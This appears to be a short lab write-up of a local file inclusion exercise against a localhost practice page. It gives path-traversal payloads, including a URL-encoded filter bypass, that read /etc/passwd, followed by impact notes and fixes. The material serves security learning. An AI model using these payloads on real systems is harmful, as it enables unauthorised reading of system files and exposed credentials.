# File Inclusion 0x01

## What is Local File Inclusion (LFI)?
LFI is a vulnerability where a website includes 
files based on user input without proper validation.
An attacker can manipulate this to read sensitive 
files from the server.

## Target
http://localhost/labs/fi0x01.php

## Vulnerability
The filename parameter accepts user input directly:
fi0x01.php?filename=chocolate_cake.txt

## Attack

### Step 1 — Identify the parameter
Intercepted request in Burp Suite Repeater:
GET /labs/fi0x01.php?filename=chocolate_cake.txt

### Step 2 — Test LFI payload
Changed filename to path traversal:
GET /labs/fi0x01.php?filename=../../../etc/passwd

### Step 3 — URL encoded bypass
Used encoded payload to bypass filters:
filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

## Result
Successfully read /etc/passwd file revealing 
all system users including root

## Screenshots
![Lab Page](screenshots/fi0x01-lab-page.png)
![LFI passwd](screenshots/fi0x01-lfi-passwd.png)
![Encoded Bypass](screenshots/fi0x01-encoded-bypass.png)

## Impact
- Attacker can read sensitive system files
- Configuration files with credentials exposed
- Source code disclosure

## Fix
- Never use user input directly in file paths
- Whitelist allowed filenames only
- Disable PHP error messages in production









